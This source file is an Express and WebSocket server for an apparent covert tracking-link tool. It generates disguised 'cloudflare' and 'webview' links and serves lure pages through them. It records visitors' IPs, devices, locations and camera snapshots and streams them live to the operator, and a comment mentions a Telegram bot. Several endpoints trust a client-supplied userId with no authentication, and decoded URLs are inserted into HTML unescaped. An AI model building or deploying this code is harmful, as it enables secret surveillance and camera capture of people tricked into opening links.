import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { insertUserSchema, insertTrackingLinkSchema, insertVisitorSchema, insertCameraSnapshotSchema } from "@shared/schema";
import bcrypt from "bcrypt";

export async function registerRoutes(app: Express): Promise<Server> {
  const httpServer = createServer(app);
  
  // WebSocket server for real-time updates
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
  
  const clients = new Set<WebSocket>();
  
  wss.on('connection', (ws) => {
    clients.add(ws);
    console.log('Client connected to WebSocket');
    
    ws.on('close', () => {
      clients.delete(ws);
      console.log('Client disconnected from WebSocket');
    });
  });

  // Broadcast to all connected clients
  function broadcast(data: any) {
    const message = JSON.stringify(data);
    clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(message);
      }
    });
  }

  // Authentication routes
  app.post("/api/auth/register", async (req, res) => {
    try {
      const userData = insertUserSchema.parse(req.body);
      
      // Check if user already exists
      const existingUser = await storage.getUserByEmail(userData.email);
      if (existingUser) {
        return res.status(400).json({ message: "User already exists" });
      }

      // Hash password
      const hashedPassword = await bcrypt.hash(userData.password, 10);
      
      const user = await storage.createUser({
        ...userData,
        password: hashedPassword
      });

      // Don't send password back
      const { password, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      res.status(400).json({ message: "Invalid registration data" });
    }
  });

  app.post("/api/auth/login", async (req, res) => {
    try {
      const { email, password } = req.body;
      
      const user = await storage.getUserByEmail(email);
      if (!user) {
        return res.status(401).json({ message: "Invalid credentials" });
      }

      const isValidPassword = await bcrypt.compare(password, user.password);
      if (!isValidPassword) {
        return res.status(401).json({ message: "Invalid credentials" });
      }

      // Don't send password back
      const { password: _, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      res.status(500).json({ message: "Login failed" });
    }
  });

  // Tracking link routes
  app.post("/api/links", async (req, res) => {
    try {
      const { userId, ...linkData } = req.body;
      
      // Validate required fields
      if (!userId || !linkData.originalUrl) {
        return res.status(400).json({ message: "Missing required fields: userId and originalUrl" });
      }
      
      const validatedData = insertTrackingLinkSchema.parse(linkData);
      const link = await storage.createTrackingLink(userId, validatedData);
      
      // Generate the actual tracking URLs
      const baseUrl = process.env.NODE_ENV === 'production' 
        ? 'https://trackwithak-623836997544.europe-west1.run.app'
        : `http://localhost:5000`;
      const encodedUrl = Buffer.from(link.originalUrl).toString('base64');
      
      const response = {
        ...link,
        cloudflareUrl: `${baseUrl}/c/${link.trackingId}/${encodedUrl}`,
        webviewUrl: `${baseUrl}/w/${link.trackingId}/${encodedUrl}`
      };

      res.json(response);
    } catch (error) {
      res.status(400).json({ message: "Invalid link data" });
    }
  });

  app.get("/api/links/:userId", async (req, res) => {
    try {
      const links = await storage.getTrackingLinksByUserId(req.params.userId);
      res.json(links);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch links" });
    }
  });

  // Visitor tracking routes
  app.post("/api/track/visit", async (req, res) => {
    try {
      const visitorData = insertVisitorSchema.parse(req.body);
      const visitor = await storage.createVisitor(visitorData);
      
      // Broadcast real-time update
      broadcast({
        type: 'new_visitor',
        data: visitor
      });
      
      res.json(visitor);
    } catch (error) {
      res.status(400).json({ message: "Invalid visitor data" });
    }
  });

  app.post("/api/track/snapshot", async (req, res) => {
    try {
      const snapshotData = insertCameraSnapshotSchema.parse(req.body);
      const snapshot = await storage.createCameraSnapshot(snapshotData);
      
      // Broadcast real-time update
      broadcast({
        type: 'new_snapshot',
        data: snapshot
      });
      
      res.json(snapshot);
    } catch (error) {
      res.status(400).json({ message: "Invalid snapshot data" });
    }
  });

  // Analytics routes
  app.get("/api/analytics/stats/:userId", async (req, res) => {
    try {
      const stats = await storage.getVisitorStats(req.params.userId);
      res.json(stats);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch stats" });
    }
  });

  app.get("/api/analytics/devices/:userId", async (req, res) => {
    try {
      const deviceStats = await storage.getDeviceStats(req.params.userId);
      res.json(deviceStats);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch device stats" });
    }
  });

  app.get("/api/analytics/locations/:userId", async (req, res) => {
    try {
      const locationStats = await storage.getLocationStats(req.params.userId);
      res.json(locationStats);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch location stats" });
    }
  });

  app.get("/api/visitors/recent", async (req, res) => {
    try {
      const visitors = await storage.getRecentVisitors(10);
      res.json(visitors);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch recent visitors" });
    }
  });

  app.get("/api/snapshots/recent", async (req, res) => {
    try {
      const snapshots = await storage.getRecentCameraSnapshots(10);
      res.json(snapshots);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch recent snapshots" });
    }
  });

  // Legacy tracking routes (compatibility with existing Telegram bot)
  app.get("/c/:trackingId/:encodedUrl", async (req, res) => {
    try {
      const { trackingId, encodedUrl } = req.params;
      const originalUrl = Buffer.from(encodedUrl, 'base64').toString();
      
      // Simple template replacement
      const fs = await import('fs');
      let template = await fs.promises.readFile('server/views/cloudflare.html', 'utf8');
      
      const baseUrl = process.env.NODE_ENV === 'production' 
        ? 'https://trackwithak-623836997544.europe-west1.run.app'
        : `http://localhost:5000`;
      
      template = template
        .replace(/{{ip}}/g, req.ip || 'unknown')
        .replace(/{{time}}/g, new Date().toISOString())
        .replace(/{{url}}/g, originalUrl)
        .replace(/{{uid}}/g, trackingId)
        .replace(/{{a}}/g, baseUrl);
      
      res.setHeader('Content-Type', 'text/html');
      res.send(template);
    } catch (error) {
      console.error('CloudFlare tracking error:', error);
      res.status(500).send('Tracking error');
    }
  });

  app.get("/w/:trackingId/:encodedUrl", async (req, res) => {
    try {
      const { trackingId, encodedUrl } = req.params;
      const originalUrl = Buffer.from(encodedUrl, 'base64').toString();
      
      // Simple template replacement
      const fs = await import('fs');
      let template = await fs.promises.readFile('server/views/webview.html', 'utf8');
      
      const baseUrl = process.env.NODE_ENV === 'production' 
        ? 'https://trackwithak-623836997544.europe-west1.run.app'
        : `http://localhost:5000`;
      
      template = template
        .replace(/{{ip}}/g, req.ip || 'unknown')
        .replace(/{{time}}/g, new Date().toISOString())
        .replace(/{{url}}/g, originalUrl)
        .replace(/{{uid}}/g, trackingId)
        .replace(/{{a}}/g, baseUrl);
      
      res.setHeader('Content-Type', 'text/html');
      res.send(template);
    } catch (error) {
      console.error('WebView tracking error:', error);
      res.status(500).send('Tracking error');
    }
  });

  return httpServer;
}
